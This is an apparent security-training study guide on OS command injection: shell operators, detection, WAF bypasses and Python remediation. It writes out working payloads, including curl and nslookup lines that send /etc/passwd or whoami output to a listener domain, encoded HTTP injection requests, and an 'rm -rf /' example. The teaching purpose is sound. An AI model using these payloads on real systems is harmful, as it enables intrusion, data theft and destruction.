# 📑 Deep-Dive Architectural Study: OS Command Injection

**Module**: 01 — Advanced Input Validation & OS Interactivity  
**Severity**: Critical (Potential for Complete Host Compromise)
---

To ensure precise classification during reporting and threat modeling, map this weakness against the following industry frameworks:

* **CWE-78 (Primary)**: OS Command Injection — The specific flaw where user input interacts directly with the operating system shell interpreter.
* **CWE-77 (Parent)**: Command Injection — The broader, global vulnerability family involving improper neutralization of input before command execution.
* **CWE-88 (Sibling)**: Argument Injection — A distinct variant where shell execution tokens are blocked, but an attacker can still inject native flags into a safe API call.
* **OWASP Top 10 Reference**: A03:2021-Injection — Classified under the main Injection category, which remains one of the highest risks to web application security.


---

## 🔬 1. Low-Level Architectural Mechanics

To understand command injection completely, you must look at how an Operating System manages processes. 

### The Kernel vs. User Space Boundary
When an application wants to interact with the host operating system (e.g., modifying files, checking network status, or querying system hardware), it cannot do so directly. It must request the OS Kernel to perform these tasks via **System Calls (syscalls)**.

```text
[ Web Application ] 
        │ (Uses unsafe wrapper functions)
        ▼
[ System Shell Interpreter (sh/bash/cmd) ] <── Attacker Payload Injected Here
        │ (Parses raw string token by token)
        ▼
[ Kernel Space (fork / execve / CreateProcess) ]
        │ (Executes malicious commands with application privileges)
        ▼
[ Host Operating System Compromised ]
```

### The Root Cause: Mixing Code and Data
The vulnerability occurs when a programming language uses a generic wrapper function that invokes a system shell (`/bin/sh` on Unix or `cmd.exe` on Windows) and passes a raw string to it. 

The shell interpreter parses strings token by token using white spaces and special characters as instructions. When user-supplied text contains these special characters, the shell interprets them as **code** rather than **data**.

---

## ⚙️ 2. Deep-Dive Syntax Execution & Tokenisation

Shells use specific terminal control operators to manage execution flow. Attackers exploit these tokens to end the legitimate application command and spawn an arbitrary secondary command.

### Comprehensive Token Matrix

| Token | OS Environment | Shell Behavior / Logic Flow | Real-World Context Example |
| :--- | :--- | :--- | :--- |
| `;` | Linux / Unix | **Sequential Execution**: Runs Command B immediately after Command A finishes, regardless of success or failure. | `ping 127.0.0.1; whoami` |
| `%0a` / `\n` | Linux & Windows | **Newline Character**: Forces the shell interpreter to view the next set of characters as a brand new command line. | `ping 127.0.0.1%0awhoami` |
| `&` | Linux & Windows | **Background / Concurrent Processing**: Spawns Command A in the background and immediately runs Command B concurrently. | `ping 127.0.0.1 & whoami` |
| `&&` | Linux & Windows | **Logical AND**: Executes Command B **only if** Command A terminates successfully (returns an exit code of `0`). | `cd /var/www && cat config.php` |
| `\|\|` | Linux & Windows | **Logical OR**: Executes Command B **only if** Command A fails or returns an error (returns a non-zero exit code). | `grep 'false' file \|\| whoami` |
| `` ` `` | Linux / Unix | **Backtick Substitution**: Evaluates the nested command first, then inserts its string output into the main command. | `echo \`whoami\`` |
| `$()` | Linux / Unix | **Standard Substitution**: Modern, nestable alternative to backticks. Executes the inner command first. | `echo $(id)` |
| `\|` | Linux & Windows | **Piping**: Establishes an inter-process communication channel. Redirects `stdout` of Command A into `stdin` of Command B. | `cat /etc/passwd \| grep root` |

---

## 🛠️ 3. Exhaustive Testing & Detection Framework

When mapping an application, detection methods are categorized by how information flows back from the target host kernel to your attack machine.

### A. In-Band (Result-Based / Error-Based Detection)
In-band injection occurs when the application captures `stdout` or `stderr` from the shell process and prints it back to the client screen inside the HTML layout or JSON response.

#### 🎯 Linux Target Discovery
If checking a product inventory parameter, append basic telemetry commands:
```bash
# Basic Verification
product_id=101; whoami

# Environmental Discovery (Kernel details, architecture)
product_id=101; uname -a

# Privilege Assessment (Current user groups, UID/GID mappings)
product_id=101; id
```

#### 🎯 Windows Target Discovery
Windows systems process terminal interactions through `cmd.exe` or PowerShell:
```bash
# Basic Verification
product_id=101 & whoami

# System Information (OS Version details)
product_id=101 & ver

# Directory Listing (Verifying write permissions)
product_id=101 & dir
```

---

### B. Blind (Time-Based Detection)
Often, developers capture the system output internally but do not display it on the web interface. The page returns the exact same HTML template whether your command works or fails. You must use resource-intensive operations to force a visible **time delay**.

#### 🎯 Linux Time-Based Payloads
Use the `sleep` utility or send a strict count of ICMP Echo Requests (`ping`) to the local loopback adapter.
```bash
# Pauses process execution thread for exactly 10 seconds
product_id=101; sleep 10

# Sends 5 ping packets. Linux pings every 1 second (approx. 5-second delay)
product_id=101; ping -c 5 127.0.0.1
```

#### 🎯 Windows Time-Based Payloads
Windows lacks a native `sleep` terminal utility by default in basic shells. Use the `ping` utility natively.
```bash
# Windows pings send 1 packet per second. 
# To create a 10-second delay, you must request 11 packets (-n 11)
product_id=101 & ping -n 11 127.0.0.1
```

---

### C. Blind Out-of-Band Application Security Testing (OAST)
If the web application executes system tasks **asynchronously** (spawning a detached background thread), time-based techniques will fail because the main web page finishes loading immediately. You must force the server to initiate an external network interaction back to a system under your direct control.

#### 🎯 DNS Exfiltration (Most Reliable)
Firewalls heavily restrict outbound HTTP traffic from production servers, but they almost always allow outbound **DNS traffic** to resolve domains.
```bash
# Forces the host to look up a unique subdomain on your listener
product_id=101; nslookup your-listener-domain.com

# Advanced: Prepend the output of system commands as a subdomain name to steal data via DNS logs
product_id=101; nslookup $(whoami).your-listener-domain.com
```

#### 🎯 HTTP Exfiltration
If outbound network restrictions are loose, force the application server to deliver files directly to your web application log viewer.
```bash
# Basic pingback
product_id=101; curl http://your-listener-domain.com

# Sensitive File Exfiltration
product_id=101; curl -X POST -d @/etc/passwd http://your-listener-domain.com
```

---

### D. 🎯 Output Redirection (File Writing / Semi-Blind Extraction)
If the vulnerability is Blind (no output on screen) but you have write permissions to a publicly accessible web directory (like an images, uploads, or assets folder), you can redirect the output of your malicious command into a static file and read it via your browser.

* **`>` (Overwrite)**: Creates a new file or overwrites an existing file with the command output.
* **`>>` (Append)**: Appends the command output to the end of an existing file.

##### 📝 Real-World Linux Extraction Example

```bash

# Injects a command to extract user accounts and saves it to the public web root
product_id=101; id > /var/www/html/images/poc.txt
```
* **Retrieval Step**: Open your browser and navigate directly to `http://vulnerable-target.com` to view the output of the `id` command.

##### 📝 Real-World Windows Extraction Example

```cmd

# Injects a command to view system details and saves it to the IIS web public folder
product_id=101 & systeminfo > C:\inetpub\wwwroot\assets\poc.txt
```

* **Retrieval Step**: Open your browser and navigate directly to `http://vulnerable-target.com`.

  ## 🚀 5. Advanced Exploitation: Bypasses & Edge Cases

When testing real-world applications, simple character separators like `;` or spaces are often blocked by Web Application Firewalls (WAFs) or input filters. You must use specialized encoding and structural bypasses.

### A. Space Filter Bypasses
If the application strips or blocks spaces (` `), you cannot separate your commands from your arguments (e.g., `cat /etc/passwd` fails).

#### Linux Space Alternatives
* **Internal Field Separator (`$IFS`)**: A built-in shell variable that defaults to a space, tab, or newline.
  ```bash
  cat$IFS/etc/passwd
  ```
### B. URL and Hex Encoding Bypasses
Many web applications use input filters or Web Application Firewalls (WAFs) that inspect raw text for dangerous characters like `;`, `&`, `|`, or spaces. If the filter checks the payload *before* the application fully URL-decodes the user input, you can bypass the signature check completely. 

When the application decodes the string right before executing the shell command, the system processes your hidden control characters natively.

#### 🎯 Standard URL Encoding Matrix
Replace blocked command separators with their equivalent hexadecimal ASCII values:

| Control Character | URL Encoded Value | Purpose |
| :--- | :--- | :--- |
| `;` | `%3B` | Standard Command Separator (Linux) |
| `&` | `%26` | Concurrent Execution Separator (Windows/Linux) |
| `\|` | `%7C` | Pipe Operator (Windows/Linux) |
| ` ` (Space) | `%20` or `+` | Argument Separation |
| `\n` (Newline) | `%0A` | Command Line Break (Bypasses many front-end filters) |

#### 📝 Real-World URL Encoding Example
If an application blocks raw semicolons, an input like `product_id=101;whoami` will trigger a security exception. By encoding the semicolon to `%3B` and spaces to `%20`, the string bypasses raw validation rules.

```http
POST /product/stock HTTP/1.1
Host: vulnerable-target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

product_id=101%3B%20cat%20/etc/passwd
```

---

#### 🎯 Double URL Encoding
If the target application sits behind a front-end reverse proxy or a WAF, the proxy might decode the input once to inspect it, and then forward it to the backend server. If the backend server decodes it a *second* time before execution, you can use **Double URL Encoding** to hide the attack signature.

* **Raw Target Token**: `& whoami`
* **Single URL Encoded**: `%26%20whoami`
* **Double URL Encoded**: `%2526%2520whoami` *(The `%` characters from the single encoding are re-encoded to `%25`)*

#### 📝 Real-World Double URL Encoding Example
The security proxy reads the input, decodes `%25` to `%`, and logs the payload as a seemingly harmless string: `%26%2520whoami`. It permits the traffic to pass. The core application server receives the filtered input, decodes it a final time to `& whoami`, and passes it directly to the vulnerable shell interpreter.

```http
POST /product/stock HTTP/1.1
Host: vulnerable-target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

product_id=101%2526%2520sleep%252010
```



## 🛡️ 6. Advanced Defensive Engineering & Remediation

Fixing command injection requires separating user-controlled strings completely from the operating system execution environment.

### 🚫 The Vulnerable Anti-Pattern
Consider this insecure Python backend using the old `os.system` pattern. It takes a user-supplied filename parameter to compress a log file:

```python
# SEVERELY VULNERABLE PRODUCTION CODE
import os

def compress_log(user_filename):
    # Attacker passes: "file.log; rm -rf /"
    command = "tar -czf compressed.tar.gz /var/logs/" + user_filename
    
    # Kernel executes: tar -czf compressed.tar.gz /var/logs/file.log; rm -rf /
    os.system(command) 
```

### ✅ The Definitively Secure Fix: Avoid System Shells entirely
The primary defense against command injection is to use native, low-level programming libraries that bypass `/bin/sh` or `cmd.exe` altogether. 

By passing arguments inside an explicit structural array, the host operating system uses the `execve` syscall family. It loads the executable binary into memory and treats user arguments strictly as static non-executable string parameters.

```python
# SECURE AND REMEDIATED PRODUCTION CODE
import subprocess

def compress_log_secure(user_filename):
    # Arguments are completely decoupled from each other inside an array
    command_array = ["/usr/bin/tar", "-czf", "compressed.tar.gz", user_filename]
    
    # shell=False ensures that NO shell interpreter is invoked. 
    # Even if user_filename contains '; whoami', it is treated literally as a filename named '; whoami'
    subprocess.run(command_array, shell=False, capture_output=True, check=True)
```

### 🔍 Secondary Defense-in-Depth: Rigid Input Tokenization
If a wrapper function or legacy environment requires direct system shell access, implement a strict **Allow-list** code verification gate.

```python
import re

def validate_input(user_input):
    # Only allow characters, numbers, and no special punctuation or shell tokens
    # Rejects semicolons, ampersands, backticks, or pipes completely
    if re.match("^[a-zA-Z0-9_\-\.]+$", user_input):
        return True
    else:
        raise ValueError("Malicious input token detected. Transaction aborted.")
```

---

